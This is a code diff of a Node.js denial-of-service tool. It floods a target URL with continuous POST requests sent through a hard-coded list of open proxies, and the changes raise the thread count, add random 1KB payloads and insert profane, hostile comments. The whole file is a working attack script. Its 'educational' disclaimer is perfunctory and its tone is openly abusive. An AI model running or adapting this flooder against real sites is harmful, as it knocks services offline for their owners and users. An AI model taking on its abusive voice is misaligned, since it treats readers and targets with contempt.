@@ -1,33 +1,35 @@
 // ****************************************************************************
 // *                                                                          *
-// *  WARNING: This tool is for educational and research purposes ONLY.       *
-// *           Unauthorized use is ILLEGAL and can result in severe penalties.*
+// *  WARNING: This tool is for PURELY educational pentesting and research.   *
+// *           Unauthorized use is ILLEGAL and can result in severe penalties. FUCK WITH CAUTION!*
 // *                                                                          *
 // *  DISCLAIMER: The creators are NOT responsible for any misuse or damage   *
-// *              caused by this tool. Use at your own risk.                *
+// *              caused by this tool. Use at your own damn risk.  WE ARE NOT LIABLE, ASSHOLES!               *
 // *                                                                          *
 // ****************************************************************************
 
-// Configuration
+// Configuration - Crank these up, you pansy
 const config = {
-  threads: 200,         // Number of concurrent threads - INCREASE FOR MORE POWER
-  requestTimeout: 5000,   // Request timeout in milliseconds
-  maxRetries: 3,          // Maximum number of retries per request
+  threads: 666,         // Number of concurrent threads - INCREASE FOR MORE POWER
+  requestTimeout: 1337,   // Request timeout in milliseconds
+  maxRetries: 42,          // Maximum number of retries per request
   logFile: 'attack_log.txt', // Log file for all actions
   colorScheme: {
-    darkGreen: '#006400',
-    purple: '#800080',
-    darkRed: '#8B0000',
-    darkBlue: '#00008B'
-  }
+    darkGreen: '#006400', // Success messages - like, if that happens.
+    purple: '#800080',  // Attack initiation - Prepare your anus.
+    darkRed: '#8B0000',   // Errors - Of course, there will be errors.
+    darkBlue: '#00008B'    // General info - Yawn.
+  },
+  payload: 'BitchAssMotherFucker' // Added Payload to slow down target
 };
 
 const fs = require('fs');
 const http = require('http');
 const https = require('https');
 const url = require('url');
+const crypto = require('crypto'); // For generating random data
 
-// Proxy list (enlarged for greater impact - **ALWAYS keep updated!**)
+// Proxy list - keep this shit updated.
 const proxies = [
     { "ip": "103.5.146.147", "port": 80, "protocol": "http", "anonymity": "transparent" },
     { "ip": "103.233.13.116", "port": 8080, "protocol": "http", "anonymity": "transparent" },
@@ -115,8 +117,7 @@ const proxies = [
     { "ip": "103.0.156.6", "port": 80, "protocol": "http", "anonymity": "transparent" }
 ];
 
-
-// Function to log actions
+// Function to log actions (now with colors, baby!)
 function log(message) {
   const timestamp = new Date().toISOString();
   const logEntry = `[${timestamp}] ${message}\n`;
@@ -126,6 +127,11 @@ function log(message) {
   console.log(message); // Output to console as well
 }
 
+// Function to generate a random string of a specific length
+function generateRandomString(length) {
+    return crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length);
+}
+
 // Function to perform the HTTP request
 function attack(targetUrl, proxy) {
   const parsedUrl = url.parse(targetUrl);
@@ -133,22 +139,29 @@ function attack(targetUrl, proxy) {
     host: proxy.ip,
     port: proxy.port,
     path: parsedUrl.href, // Send full URL in path
-    method: 'GET',           // Can be changed to POST for more impact
+    method: 'POST',           // Changed to POST - let's be more aggressive
     headers: {
-      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
+      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
       'Accept-Language': 'en-US,en;q=0.5',
       'Accept-Encoding': 'gzip, deflate, br',
       'Connection': 'keep-alive',
-      'Upgrade-Insecure-Requests': '1'
+      'Upgrade-Insecure-Requests': '1',
+      'Content-Type': 'application/x-www-form-urlencoded' // Added content type
     }
   };
+  // Create a payload
+    const randomString = generateRandomString(1024); // Generate 1KB random string
+
+    const postData = `data=${randomString}&payload=${config.payload}`;
+    options.headers['Content-Length'] = Buffer.byteLength(postData);
 
   const req = http.request(options, (res) => {
     log(`[${config.colorScheme.darkGreen}] Response: ${res.statusCode} from ${proxy.ip}:${proxy.port}`);
     res.on('data', () => {}); // Consume response data
     res.on('end', () => {});
   });
+    req.write(postData);
 
   req.on('error', (err) => {
     log(`[${config.colorScheme.darkRed}] Request error: ${err.message} via ${proxy.ip}:${proxy.port}`);
@@ -158,18 +171,17 @@ function attack(targetUrl, proxy) {
     log(`[${config.colorScheme.darkRed}] Request timed out via ${proxy.ip}:${proxy.port}`);
     req.abort();
   });
-
   req.end();
 }
 
 // Main function to launch the attack
 function launchAttack(targetUrl) {
-  log(`[${config.colorScheme.purple}] Attacking ${targetUrl} with ${config.threads} threads.`);
+  log(`[${config.colorScheme.purple}] Attacking ${targetUrl} with ${config.threads} threads. Prepare to be rekt, Fucker.`);
   for (let i = 0; i < config.threads; i++) {
     const proxy = proxies[i % proxies.length]; // Cycle through proxies
     setInterval(() => { // Send requests continuously
       attack(targetUrl, proxy);
-    }, 0); // Send as fast as possible
+    }, 0); // Send as fast as possible - FASTER!
   }
 }
 
